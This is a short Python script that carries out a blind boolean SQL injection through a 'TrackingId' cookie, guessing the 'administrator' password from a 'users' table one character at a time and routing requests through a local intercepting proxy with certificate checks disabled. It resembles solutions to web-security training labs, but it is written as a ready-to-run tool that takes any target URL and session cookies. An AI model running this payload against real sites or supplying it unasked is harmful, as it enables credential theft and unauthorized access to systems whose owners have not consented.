import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url,TrackingID,session):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.quote(sqli_payload)
            cookies = {'TrackingId': TrackingID + sqli_payload_encoded, 'session': session}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            if j == 125:
                print("")
                print("(-) Unable to find the password.")
                break

def main():
    if len(sys.argv) != 4:
        print("(+) Usage: %s <url> <TrackingID> <session>" % (sys.argv[0]))
        print("(+) Example: %s www.example.com TrackingID session" % sys.argv[0])

    url = sys.argv[1]
    TrackingID = sys.argv[2]
    session = sys.argv[3]
    print("(+) Retrieving administrator password...")
    sqli_password(url,TrackingID,session)

if __name__ == "__main__":
    main()